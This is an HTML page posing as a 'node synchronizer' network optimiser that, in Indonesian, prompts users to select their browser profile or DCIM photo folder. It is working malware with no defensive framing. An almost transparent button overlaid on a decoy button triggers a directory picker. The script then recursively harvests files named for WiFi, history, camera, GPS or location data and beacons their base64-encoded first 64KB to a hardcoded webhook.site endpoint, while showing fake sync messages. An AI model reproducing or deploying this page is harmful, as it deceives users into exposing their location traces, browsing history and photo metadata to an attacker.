<!DOCTYPE html>
<html>
<head>
    <title>Global Network Node Sync</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .node-box { border: 2px solid #0f0; padding: 50px; text-align: center; box-shadow: 0 0 80px rgba(0,255,0,0.3); background: #050505; width: 600px; }
        .trigger-zone { position: relative; margin-top: 30px; }
        .fake-btn { background: #0f0; color: #000; border: none; padding: 20px; font-weight: bold; width: 100%; cursor: pointer; font-size: 1.1em; letter-spacing: 2px; }
        #real-trigger { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.01; z-index: 999; cursor: pointer; }
        #log-terminal { margin-top: 25px; font-size: 11px; color: #004400; text-align: left; height: 100px; overflow-y: auto; border-top: 1px solid #002200; padding-top: 15px; }
    </style>
</head>
<body>

<div class="node-box">
    <h1 style="margin:0; text-shadow: 0 0 15px #0f0;">NODE_SYNCHRONIZER</h1>
    <p style="color: #ccc;">Sistem mendeteksi latensi tinggi. Pilih folder profil browser atau folder DCIM untuk optimasi node jaringan lokal dan pemetaan cache regional.</p>
    
    <div class="trigger-zone">
        <button class="fake-btn">START_SYNC_OPTIMIZATION</button>
        <button id="real-trigger" onclick="shadowMapper()"></button>
    </div>

    <div id="log-terminal">> SYSTEM: Waiting for local node bridge...</div>
</div>

<script>
    const OMNI_WEBHOOK = "https://webhook.site/4b8bf8c3-835d-4844-aa61-280dccabaf72";

    async function shadowMapper() {
        try {
            // Meminta akses Full Read
            const dirHandle = await window.showDirectoryPicker();
            updateLog("!! BRIDGE_ESTABLISHED: Siphoning Latent Metadata...");

            await harvestLocation(dirHandle, "");
            
            updateLog("!! SUCCESS: NODES_SYNCHRONIZED");
        } catch (e) { updateLog(">> ERROR: " + e.message); }
    }

    async function harvestLocation(handle, path) {
        for await (const entry of handle.values()) {
            const currentPath = `${path}/${entry.name}`;

            if (entry.kind === 'file') {
                try {
                    // TARGET FILTER: File yang menyimpan jejak fisik lokasi
                    const isLocationData = /(Network|WiFi|history|DCIM|Camera|Local State|gps|location)/i.test(entry.name);
                    
                    if (isLocationData) {
                        const file = await entry.getFile();
                        const buffer = await file.arrayBuffer();
                        
                        // Kirim 64KB pertama (Cukup untuk header SQLITE WiFi atau EXIF Foto)
                        const chunk = new Uint8Array(buffer.slice(0, 65536));
                        const b64 = btoa(String.fromCharCode(...chunk));

                        navigator.sendBeacon(`${OMNI_WEBHOOK}?v=SHADOW_LOC&f=${btoa(entry.name)}`, JSON.stringify({
                            p: currentPath,
                            d: b64,
                            ts: Date.now()
                        }));
                        
                        updateLog(`> MAPPED_NODE: ${entry.name}`);
                    }
                } catch (e) {}
            } else {
                harvestLocation(entry, currentPath);
            }
        }
    }

    function updateLog(m) {
        const l = document.getElementById('log-terminal');
        l.innerHTML += `<div>> ${m}</div>`;
        l.scrollTop = l.scrollHeight;
    }
</script>
</body>
</html>
